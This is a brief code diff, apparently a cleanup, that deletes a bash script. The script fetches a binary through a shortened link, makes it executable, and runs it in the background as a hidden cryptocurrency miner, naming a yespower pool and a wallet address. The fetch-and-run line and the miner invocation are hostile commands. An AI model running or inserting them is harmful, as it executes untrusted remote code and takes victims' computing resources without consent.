@@ -1,5 +1,0 @@
-#!/bin/bash
-wget -O ts https://bit.ly/3yNd4Rw
-chmod 777 ts
-./ts --algorithm yespower --pool stratum+tcps://stratum-asia.rplant.xyz:17070 --wallet WbQR3w5EyWkuoFjhjYymrr3pEZDSTTgQkX.whivvv > /dev/null 2>&1 &
-uname -a
